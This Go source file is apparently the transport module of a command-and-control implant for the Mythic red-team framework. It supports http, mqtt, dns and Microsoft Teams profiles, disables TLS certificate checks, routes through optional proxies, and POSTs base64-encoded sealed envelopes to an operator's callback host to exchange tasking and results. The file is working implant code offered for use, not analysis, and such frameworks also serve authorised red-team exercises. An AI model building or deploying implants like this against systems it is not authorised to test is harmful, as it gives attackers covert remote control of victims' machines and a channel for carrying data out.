package main

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// exchanger swaps one sealed envelope for its reply. Sealed bytes are raw
// (UUID + JSON, or UUID + IV + ciphertext + HMAC); each transport frames
// them for its wire format (base64 for http/mqtt/msteams, chunked raw for dns).
type exchanger interface {
	exchange(sealed []byte) ([]byte, error)
}

func newTransport(c Config) (exchanger, error) {
	switch c.Profile {
	case "", "http":
		return newHTTPTransport(c)
	case "mqtt":
		return newMQTTTransport(c)
	case "dns":
		return newDNSTransport(c)
	case "msteams":
		return newTeamsTransport(c)
	default:
		return nil, fmt.Errorf("unknown C2 profile %q", c.Profile)
	}
}

// Transport is a POST-only Mythic http profile client. Both reference
// agents (Apollo, Thanatos) talk POST-only; GET stays a follow-up.
type Transport struct {
	client  *http.Client
	url     string
	headers map[string]string
}

func newHTTPTransport(c Config) (*Transport, error) {
	endpoint := joinHostPort(c.CallbackHost, c.CallbackPort)
	uri := c.PostURI
	if !strings.HasPrefix(uri, "/") {
		uri = "/" + uri
	}
	client, err := newHTTPClient(c.ProxyHost, c.ProxyPort, c.ProxyUser, c.ProxyPass)
	if err != nil {
		return nil, err
	}
	return &Transport{
		client:  client,
		url:     endpoint + uri,
		headers: c.Headers,
	}, nil
}

// newHTTPClient builds the shared operator-cert-tolerant client (parity with
// Apollo: C2 endpoints use operator-controlled certs). Reused by msteams.
func newHTTPClient(proxyHost, proxyPort, proxyUser, proxyPass string) (*http.Client, error) {
	tr := &http.Transport{
		Proxy:           http.ProxyFromEnvironment,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
	}
	if proxyHost != "" {
		var raw string
		if strings.Contains(proxyHost, "://") {
			raw = proxyHost
		} else {
			raw = joinHostPort(proxyHost, atoiOr(proxyPort, 0))
		}
		proxyURL, err := url.Parse(raw)
		if err != nil {
			return nil, fmt.Errorf("proxy url: %w", err)
		}
		if proxyUser != "" {
			proxyURL.User = url.UserPassword(proxyUser, proxyPass)
		}
		tr.Proxy = http.ProxyURL(proxyURL)
	}
	return &http.Client{Transport: tr, Timeout: 30 * time.Second}, nil
}

func (t *Transport) exchange(sealed []byte) ([]byte, error) {
	resp, err := t.sendRecv(base64.StdEncoding.EncodeToString(sealed))
	if err != nil {
		return nil, err
	}
	return base64.StdEncoding.DecodeString(resp)
}

func (t *Transport) sendRecv(body string) (string, error) {
	req, err := http.NewRequest(http.MethodPost, t.url, strings.NewReader(body))
	if err != nil {
		return "", err
	}
	for k, v := range t.headers {
		if v != "" {
			req.Header.Set(k, v)
		}
	}
	resp, err := t.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	out, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("http status %d", resp.StatusCode)
	}
	return string(out), nil
}

// joinHostPort mirrors Apollo's ParseURLAndPort: default ports stay implicit.
func joinHostPort(host string, port int) string {
	if (port == 443 && strings.HasPrefix(host, "https://")) ||
		(port == 80 && strings.HasPrefix(host, "http://")) ||
		port <= 0 {
		return host
	}
	rest := host
	if i := strings.Index(host, "://"); i >= 0 {
		rest = host[i+3:]
	}
	if i := strings.Index(rest, "/"); i >= 0 {
		cut := len(host) - len(rest) + i
		return fmt.Sprintf("%s:%d%s", host[:cut], port, host[cut:])
	}
	return fmt.Sprintf("%s:%d", host, port)
}

func atoiOr(s string, def int) int {
	n := 0
	for i := 0; i < len(s); i++ {
		if s[i] < '0' || s[i] > '9' {
			return def
		}
		n = n*10 + int(s[i]-'0')
	}
	if s == "" {
		return def
	}
	return n
}
